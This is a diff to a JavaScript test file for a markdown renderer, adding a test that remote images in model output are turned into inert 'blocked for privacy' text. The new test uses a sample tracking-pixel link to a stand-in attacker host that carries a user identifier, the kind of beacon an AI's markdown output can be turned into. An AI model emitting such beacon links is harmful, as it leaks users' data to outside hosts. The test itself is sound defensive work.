@@ -46,10 +46,18 @@ describe("renderMd tables", () => {
 
 describe("renderMd images", () => {
   it("tags inline images with the lightbox/fade-in class and lazy-loads them", () => {
-    const html = renderMd("![a screenshot](https://example.com/shot.png)");
+    const html = renderMd("![a screenshot](data:image/png;base64,AA==)");
     expect(html).toContain('class="md-img"');
     expect(html).toContain('loading="lazy"');
     expect(html).toContain('decoding="async"');
+  });
+
+  it("turns remote images into inert text so model output cannot emit tracking beacons", () => {
+    const html = renderMd("![build result](https://attacker.example/pixel?id=user)");
+    expect(html).toContain("Remote image blocked for privacy");
+    expect(html).toContain("build result");
+    expect(html).not.toContain("attacker.example");
+    expect(html).not.toContain("<img");
   });
 });
 
